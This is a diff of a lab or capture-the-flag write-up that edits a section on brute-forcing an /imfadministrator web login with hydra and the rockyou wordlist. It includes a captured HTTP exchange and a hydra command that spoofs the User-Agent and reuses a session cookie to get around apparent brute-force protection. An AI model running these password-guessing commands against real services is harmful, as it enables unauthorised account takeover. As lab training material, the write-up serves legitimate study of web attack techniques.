@@ -158,37 +158,5 @@ I'll try to brute force Roger's account using hydra and a list built into kali a
 cd /usr/share/wordlists/
 gunzip ./rockyou.txt.gz
 
-hydra 172.16.1.76 http-form-post "/imfadministrator:user=^USER^&pass=^PASS^:Invalid password" -l rmichaels -P /usr/share/wordlists/rockyou.txt
-```
-The problem I have now is that I keep on getting different results when I run and a whole bunch of false positives. This could be brute force protection behind the server or the login attempts are coming in too fast for the server to respond with the correct "Invalid password" string.  After throttling the threads down to 1, I still get false positives. I'm guessing there's some type of protection against brute forcing. I need to see the http response when hydra is being ran. It looks like I should be able to use Hydra through a proxy, but I can find solid documenation on how to do that from the command line. So I'll just fire up Wireshark to follow the http streams. Here's the conversation:
-
-```
-GET /imfadministrator HTTP/1.0
-Cookie: PHPSESSID=8qicfn6g1dneig1p7ro06i10g4
-Host: 192.168.100.76
-User-Agent: Mozilla/5.0 (Hydra)
-
-HTTP/1.1 301 Moved Permanently
-Date: Wed, 09 Nov 2016 00:31:35 GMT
-Server: Apache/2.4.18 (Ubuntu)
-Location: http://192.168.100.76/imfadministrator/
-Content-Length: 327
-Connection: close
-Content-Type: text/html; charset=iso-8859-1
-
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>301 Moved Permanently</title>
-</head><body>
-<h1>Moved Permanently</h1>
-<p>The document has moved <a href="http://192.168.100.76/imfadministrator/">here</a>.</p>
-<hr>
-<address>Apache/2.4.18 (Ubuntu) Server at 192.168.100.76 Port 80</address>
-</body></html>
-
-```
-
-So it looks like I'm being given a 301 error when logging in through hydra. Possibly being blocked due to Hydras user-agent.
-```
-hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 192.168.100.76 http-form-post "/imfadministrator:user^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=8qicfn6g1dneig1p7ro06i10g4; User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" -t 1
+hydra 172.16.1.76 http-form-post "/imfadministrator/:user=^USER^&pass=^PASS^:Invalid password" -l rmichaels -P /usr/share/wordlists/rockyou.txt
 ```
